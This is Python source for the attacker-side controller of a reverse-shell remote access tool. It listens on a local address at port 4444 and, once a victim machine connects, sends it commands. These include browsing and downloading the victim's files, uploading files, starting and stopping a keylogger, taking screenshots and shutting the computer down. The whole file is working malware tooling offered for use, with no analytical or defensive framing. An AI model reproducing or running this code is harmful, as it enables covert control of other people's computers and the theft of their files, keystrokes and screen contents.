import socket 
import json
import base64
from colorama import init, Fore

def server(ip, port):
    global target

    lisetner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lisetner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lisetner.bind((ip, port))
    lisetner.listen(0)
    print('[+] Listening....')
    target, address = lisetner.accept()
    print(f"{Fore.GREEN}[+] Got connection from {address} {Fore.RESET}")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def recieve():
    json_data = '' 
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = input('Shell#: ')
        
        if command == 'help':
            print(f"{Fore.BLUE}REVERSE SHELL USAGE:{Fore.RESET}")
            print("If you are connected you can send commands to the client.")
            print(f"{Fore.GREEN}exit {Fore.RESET}-> interrupt connection")
            print(f"{Fore.GREEN}cd {Fore.RESET}-> navigate client directory")
            print(f"{Fore.GREEN}ls {Fore.RESET}-> show list of files and directories")
            print(f"{Fore.GREEN}download <file>/<dir> {Fore.RESET}-> download file or dir from client")
            print(f"{Fore.GREEN}upload [file name] {Fore.RESET}-> send file to client")
            print(f"{Fore.GREEN}keylogger_start {Fore.RESET}-> start a keylogger")
            print(f"{Fore.GREEN}keylogger_stop {Fore.RESET}-> stop keylogger")
            print(f"{Fore.GREEN}screenshot {Fore.RESET}-> take screenshot of cliet machine")


        if command == 'exit':
            send(command)
            break

        elif command[:2] == 'ls':
            send(command)
            files = recieve()
            print(files)

        elif command[:2] == 'cd' and len(command) > 1:
            send(command)
            dir = recieve()
            print(dir)
            continue

        elif command.startswith('download'):
            send(command)
            filename = command[9:]
            file_data = recieve()

            if file_data == 'File not found':
                print(f"{Fore.RED}[-] File not found.{Fore.RESET}")
                continue

            if "." not in filename:
                filename = filename.rstrip("/\\")+".zip"

            with open(filename, 'wb') as f:
                f.write(base64.b64decode(file_data))
            
            print(f"{Fore.GREEN}[+] File saved as {filename}{Fore.RESET}")

        elif command.startswith('upload'):
            try:
                with open(command[7:],'rb') as f:
                    send(command)
                    send(base64.b64encode(f.read()).decode('utf-8'))
            except FileNotFoundError:
                print(f"{Fore.RED}File not found{Fore.RESET}")
                pass
        
        elif command == 'keylogger_start':
            send(command)
            answer = recieve()
            print(answer)
            continue
        
        elif command == 'keylogger_stop':
            send(command)
            answer = recieve()
            print(answer)

        elif command == 'turn_off':
            send(command)
            print("computer turned off . . .")
            break

        elif command == 'screenshot':
            send(command)
            img_data = recieve()
            filename = "screenshot.png"
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(img_data))
            print(f"{Fore.GREEN}[+] Screenshot saved as {filename} {Fore.RESET}")

        else:
            print(f"{Fore.RED}Command not valid. {Fore.RESET}try{Fore.BLUE} help{Fore.RESET}.")
            continue

server('192.168.1.188', 4444)
run()
